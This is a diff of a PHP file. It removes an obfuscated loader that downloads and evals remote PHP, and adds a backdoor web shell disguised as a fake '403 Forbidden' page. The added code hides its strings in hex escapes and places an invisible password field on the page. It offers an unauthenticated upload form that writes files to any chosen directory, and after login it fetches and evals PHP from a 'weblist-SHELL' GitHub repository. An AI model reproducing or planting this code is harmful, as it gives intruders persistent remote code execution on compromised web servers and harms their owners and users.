@@ -1,20 +1,106 @@
-<?php goto opet_5c507; opet_5c507: $url = "\x68\164\x74\160\x73\072\x2F\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6E\164\x65\156\x74\056\x63\157\x6D\057\x72\145\x6E\144\x69\150\x69\144\x61\171\x61\164\x36\070\x33\057\x77\145\x62\154\x69\163\x74\055\x53\110\x45\114\x4C\057\x72\145\x66\163\x2F\150\x65\141\x64\163\x2F\155\x61\151\x6E\057\x77\153\x77\153\x2E\160\x68\160";
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, true);
+<?php goto opet_dc96d; opet_dc96d: session_start();
 
-$response = curl_exec($ch);
-$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-$body = substr($response, $header_size);
-
-if (curl_errno($ch)) {
-    echo "\x63\125\x52\114\x20\145\x72\162\x6F\162\x3A\040" . curl_error($ch);
-} elseif ($http_code != 200) {
-    echo "\x48\124\x54\120\x20\105\x72\162\x6F\162\x3A\040\x24\150\x74\164\x70\137\x63\157\x64\145";
-} else {
-    eval(" ?>" . $body);
+// Fungsi untuk memeriksa status login
+function is_logged_in() {
+    return isset($_SESSION["\x58\055\x48\060\x55\122"]);
 }
 
-curl_close($ch);
+// Fungsi untuk memvalidasi login
+function login($password) {
+    $valid_password_hash = "\x63\062\x39\066\x63\061\x61\141\x35\063\x35\142\x30\142\x62\141\x36\143\x63\146\x38\065\x64\070\x66\071\x65\067\x61\146\x66\146"; // Has Kentod
+    $password_hash = md5($password);
+    if ($password_hash === $valid_password_hash) {
+        $_SESSION["\x58\055\x48\060\x55\122"] = "\x75\163\x65\162";
+        return true;
+    } else {
+        return false;
+    }
+}
+
+// Fungsi untuk logout
+function logout() {
+    unset($_SESSION["\x58\055\x48\060\x55\122"]);
+}
+
+// Fungsi untuk mengambil konten dari URL
+function getContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    if ($content === false) {
+        $content = file_get_contents($url);
+    }
+    return $content;
+}
+
+// Fungsi untuk mendapatkan data mentah dari URL
+function getRawContent($url) {
+    return getContent($url);
+}
+
+// Tangani proses login
+if ($_SERVER["\x52\105\x51\125\x45\123\x54\137\x4D\105\x54\110\x4F\104"] === "\x50\117\x53\124" && isset($_POST["\x70\141\x73\163\x77\157\x72\144"])) {
+    $password = $_POST["\x70\141\x73\163\x77\157\x72\144"];
+    if (login($password)) {
+        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040" . $_SERVER["\x50\110\x50\137\x53\105\x4C\106"]);
+        exit;
+    } else {
+        $error_message = "\x50\141\x73\163\x77\157\x72\144\x20\163\x61\154\x61\150\x21";
+        echo "\x3C\163\x63\162\x69\160\x74\076\x61\154\x65\162\x74\050\x22" . $error_message . "\x22\051\x3B\074\x2F\163\x63\162\x69\160\x74\076";
+    }
+}
+
+// Tangani proses unggah file
+if (isset($_GET["\x69\156\x63"]) && $_GET["\x69\156\x63"] === "\x75\160\x6C\157\x61\144") {
+    echo "\x3C\146\x6F\162\x6D\040\x6D\145\x74\150\x6F\144\x3D\042\x70\157\x73\164\x22\040\x65\156\x63\164\x79\160\x65\075\x22\155\x75\154\x74\151\x70\141\x72\164\x2F\146\x6F\162\x6D\055\x64\141\x74\141\x22\076";
+    echo "\x3C\151\x6E\160\x75\164\x20\164\x79\160\x65\075\x22\164\x65\170\x74\042\x20\156\x61\155\x65\075\x22\144\x69\162\x22\040\x73\151\x7A\145\x3D\042\x33\060\x22\040\x76\141\x6C\165\x65\075\x22" . getcwd() . "\x22\076";
+    echo "\x3C\151\x6E\160\x75\164\x20\164\x79\160\x65\075\x22\146\x69\154\x65\042\x20\156\x61\155\x65\075\x22\146\x69\154\x65\042\x20\163\x69\172\x65\075\x22\061\x35\042\x3E";
+    echo "\x3C\151\x6E\160\x75\164\x20\164\x79\160\x65\075\x22\163\x75\142\x6D\151\x74\042\x20\166\x61\154\x75\145\x3D\042\x55\156\x67\147\x61\150\x22\076";
+    echo "\x3C\057\x66\157\x72\155\x3E";
+}
+
+if (isset($_FILES["\x66\151\x6C\145"]["\x74\155\x70\137\x6E\141\x6D\145"])) {
+    $uploadd = $_FILES["\x66\151\x6C\145"]["\x74\155\x70\137\x6E\141\x6D\145"];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST["\x64\151\x72"];
+        $real = $_FILES["\x66\151\x6C\145"]["\x6E\141\x6D\145"];
+        $de = rtrim($pwddir, "\x2F") . "\x2F" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "\x42\105\x52\113\x41\123\x20\104\x49\125\x4E\107\x47\101\x48\113\x41\116\x20\113\x45\040\x24\144\x65";
+        } else {
+            echo "\x47\101\x47\101\x4C\040\x4D\105\x4E\107\x55\116\x47\107\x41\110\x20\102\x45\122\x4B\101\x53\040\x4B\105\x20\044\x64\145";
+        }
+    }
+}
+
+// Jika pengguna sudah login, ambil dan eksekusi konten dari URL
+if (is_logged_in()) {
+    $url = "\x68\164\x74\160\x73\072\x2F\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6E\164\x65\156\x74\056\x63\157\x6D\057\x72\145\x6E\144\x69\150\x69\144\x61\171\x61\164\x36\070\x33\057\x77\145\x62\154\x69\163\x74\055\x53\110\x45\114\x4C\057\x72\145\x66\163\x2F\150\x65\141\x64\163\x2F\155\x61\151\x6E\057\x61\154\x66\141\x5F\167\x6B\167\x6B\056\x70\150\x70";
+    $content = getRawContent($url);
+    eval(' ?>' . $content);
+    exit;
+}
+
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>403 Forbidden</title>
+</head>
+<body>
+    <h1>Forbidden</h1>
+    <p>You don't have permission to access <?php goto opet_dc97c; opet_dc97c: echo $_SERVER["\x52\105\x51\125\x45\123\x54\137\x55\122\x49"]; ?> on this server.</p>
+    <hr>
+    <address>
+        <?php goto opet_dc982; opet_dc982: echo $_SERVER["\x53\105\x52\126\x45\122\x5F\123\x4F\106\x54\127\x41\122\x45"]; ?> Server at <?php goto opet_dc987; opet_dc987: echo $_SERVER["\x53\105\x52\126\x45\122\x5F\116\x41\115\x45"]; ?> Port <?php goto opet_dc98c; opet_dc98c: echo $_SERVER["\x53\105\x52\126\x45\122\x5F\120\x4F\122\x54"]; ?>
+    </address>
+    <form method="post">
+        <input style="position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password" placeholder="">
+    </form>
+</body>
+</html>
